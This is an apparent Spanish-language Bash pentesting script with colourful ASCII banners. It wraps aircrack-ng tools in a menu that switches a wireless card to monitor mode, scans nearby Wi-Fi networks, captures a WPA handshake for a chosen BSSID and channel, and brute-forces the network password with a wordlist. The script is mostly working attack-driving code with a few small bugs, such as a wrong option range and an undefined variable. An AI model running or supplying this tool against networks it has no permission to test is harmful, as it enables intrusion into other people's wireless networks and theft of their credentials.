#!/bin/bash

# Author: EmixBasicPentester

if [[ $EUID -ne 0 ]]; then


echo -e "\e[0;36m███████████████████████████████████████████████████████████████████████████████████████████████\e[0m"
echo -e "\e[0;36m█░░░░░░░░░░░░░░█░░░░░░█████████░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█\e[0m"
echo -e "\e[0;36m█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█\e[0m"
echo -e "\e[0;36m█░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███░░░░░░▄▀░░░░░░█░░▄▀░░░░░░▄▀░░█\e[0m"
echo -e "\e[0;36m█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░████░░▄▀░░███████░░▄▀░░█████░░▄▀░░██░░▄▀░░█\e[0m"
echo -e "\e[0;36m█░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███████░░▄▀░░█████░░▄▀░░░░░░▄▀░░█\e[0m"
echo -e "\e[0;36m█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███████░░▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█\e[0m"
echo -e "\e[0;36m█░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███████░░▄▀░░█████░░▄▀░░░░░░▄▀░░█\e[0m"
echo -e "\e[0;36m█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████████░░▄▀░░█████░░▄▀░░██░░▄▀░░█\e[0m"
echo -e "\e[0;36m█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█\e[0m"
echo -e "\e[0;36m█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█\e[0m"
echo -e "\e[0;36m█░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█████░░░░░░█████░░░░░░██░░░░░░█\e[0m"
echo -e "\e[0;36m███████████████████████████████████████████████████████████████████████████████████████████████\e[0m"

echo -e "\e[0;31m¡Necesita ser super usuario para ejecutar este script!\e[0m" 1>&2
exit 1
fi

trap Ctrl_c INT

function Ctrl_c(){
	echo -e "\e[0;33mSaliendo del script\e[0m"
}

function limpiar {
	clear
}

sleep 1s
limpiar
sleep 3s
echo -e "\e[0;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~\e[0m"
echo -e "\e[1;33m ______             _  _  _ _\e[0m" 
echo -e "\e[1;33m(_____ \           (_)(_)(_|_)\e[0m"
echo -e "\e[1;33m _____) )____ ____  _  _  _ _ \e[0m"
echo -e "\e[1;33m|  ____/ ___ |  _ \| || || | |\e[0m"
echo -e "\e[1;33m| |    | ____| | | | || || | |\e[0m"
echo -e "\e[1;33m|_|    |_____)_| |_|\_____/|_|\e[0m"
echo -e "\e[0;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~\e[0m"
echo -e "\e[1;35m			V.1\e[0m"
echo ""
sleep 1s
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1s
echo -n -e "\e[1;34mEscoga una interfaz: \e[0m"
read interfaz
echo ""
while :
do
echo -e "\e[0;35m*OPCIONES*\e[0m"
echo -e "\e[0;34m(1) Activar modo monitor\e[0m"
echo -e "\e[0;34m(2) Activar modo manager\e[0m"
echo -e "\e[0;34m(3) Redes wifi disponibles\e[0m"
echo -e "\e[0;34m(4) Capturar handshake\e[0m"
echo -e "\e[0;34m(5) Fuerza bruta\e[0m"
echo -n -e "\e[1;31mEliga una opcion [1-4]: \e[0m"
read opcion
echo ""
case $opcion in
1) echo "Activando modo monitor...";
airmon-ng start $interfaz;;
2) echo "Activando modo manager...";
airmon-ng stop $interfaz;;
3) echo "Esperando resultados...";
airodump-ng $interfaz;;
4) echo -n -e "";
echo -n -e "\e[0;30mBSSID: \e[0m";
read BSSID;
echo -n -e "\e[0;30mCHANNEL: \e[0m";
read CH;
echo -n -e "\e[0;30mNombre del fichero: \e[0m";
read fich;
airodump-ng -c $CH --bssid $BSSID -w $fich $interfaz;;
5) echo -n -e "";
echo -e -n "\e[0;35mRuta de diccionario: \e[0m"
read dicc
aircrack-ng -w $dicc -b $BSSID $fich.cap;;
*) echo "$opc Opcion incorrecta";
echo "Presiona una tecla para continuar...";
read foo;;
esac
done
echo ""
sleep 1s
